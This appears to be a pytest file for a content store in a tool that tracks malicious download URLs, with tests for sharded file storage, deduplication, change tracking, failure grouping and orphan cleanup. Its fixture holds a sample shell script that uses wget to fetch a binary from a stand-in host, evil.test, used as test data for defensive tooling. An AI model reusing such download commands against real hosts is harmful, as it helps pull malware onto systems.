import hashlib
import os

from common import content_store
from tests.factories import insert_content, insert_download, insert_url

SCRIPT = b"#!/bin/sh\nwget http://evil.test/x86\n"


def test_write_content_file_is_sharded_and_deduplicated(content_dir):
    sha256 = hashlib.sha256(SCRIPT).hexdigest()

    path = content_store.write_content_file(content_dir, sha256, SCRIPT)

    assert path == os.path.join(content_dir, sha256[:2], sha256[2:4], sha256)
    assert open(path, "rb").read() == SCRIPT
    mtime = os.path.getmtime(path)
    assert content_store.write_content_file(content_dir, sha256, SCRIPT) == path
    assert os.path.getmtime(path) == mtime  # existing file is not rewritten


def test_get_or_create_content_deduplicates_and_classifies(db, content_dir):
    first = content_store.get_or_create_content(db, content_dir, SCRIPT, mime_type="application/x-sh")
    second = content_store.get_or_create_content(db, content_dir, SCRIPT)

    assert first["created"] is True and second["created"] is False
    assert first["id"] == second["id"]
    assert db.execute("SELECT COUNT(*) FROM content").fetchone()[0] == 1
    # FakeMagika classified the new payload
    assert db.execute("SELECT file_category, magika_label FROM content").fetchone() == ("script", "shell")


def test_record_download_observation_change_types(db):
    url = insert_url(db)
    old, new = insert_content(db, b"v1"), insert_content(db, b"v2")

    for content_id, fetched_at in [(old, "2026-01-01T00:00:00"), (old, "2026-01-02T00:00:00"),
                                   (new, "2026-01-03T00:00:00"), (None, "2026-01-04T00:00:00")]:
        content_store.record_download_observation(db, url, content_id=content_id, fetched_at=fetched_at)

    rows = db.execute("SELECT change_type FROM download_observations ORDER BY fetched_at").fetchall()
    assert [r[0] for r in rows] == ["initial", "confirmed", "content_changed", "unavailable"]


def test_content_versions_group_failed_fetches_by_reason(db):
    url = insert_url(db)
    stored = insert_content(db, b"v1")
    insert_download(db, url, stored, fetched_at="2026-01-01T00:00:00")
    insert_download(db, url, fetched_at="2026-01-02T00:00:00", fetch_error="timeout")
    insert_download(db, url, fetched_at="2026-01-03T00:00:00", fetch_error="timeout")
    insert_download(db, url, fetched_at="2026-01-04T00:00:00", status_code=404, fetch_error="http_error")
    insert_download(db, url, fetched_at="2026-01-05T00:00:00", status_code=None)  # recorded before migration 009

    versions = content_store.get_content_versions(db, url)

    assert [(v["content_id"], v["fetch_count"], v["failure"]) for v in versions] == [
        (stored, 1, None),
        (None, 2, "Connection timed out"),
        (None, 1, "Server returned HTTP 404"),
        (None, 1, "No HTTP response (connection failed or timed out)"),
    ]


def test_fetch_error_is_not_stored_with_content(db):
    url = insert_url(db)
    content_id = insert_content(db, b"v1")

    content_store.record_download_observation(db, url, content_id=content_id, fetch_error="timeout")

    assert db.execute("SELECT fetch_error FROM download_observations").fetchone() == (None,)


def test_cleanup_orphan_content_keeps_shared_payloads(db, content_dir):
    a, b = insert_url(db, "http://a.test/x"), insert_url(db, "http://b.test/x")
    shared = insert_content(db, b"shared", content_dir=content_dir)
    orphan = insert_content(db, b"orphan", content_dir=content_dir)
    insert_download(db, a, shared)
    insert_download(db, b, shared)
    insert_download(db, a, orphan)
    orphan_path = db.execute("SELECT file_path FROM content WHERE id = ?", (orphan,)).fetchone()[0]

    candidates = {cid for cid, _ in content_store.content_ids_for_urls(db, [a])}
    content_store.delete_urls(db, [a])
    summary = content_store.cleanup_orphan_content(db, candidates=candidates)

    assert summary == {"removed": 1, "skipped_shared": 1, "file_errors": 0}
    assert [r[0] for r in db.execute("SELECT id FROM content").fetchall()] == [shared]
    assert not os.path.exists(orphan_path)


def test_resolve_source_ip_uses_fake_dns(fake_dns):
    assert content_store.resolve_source_ip("http://evil.test/a.sh") == "192.0.2.1"
    assert fake_dns == ["evil.test"]
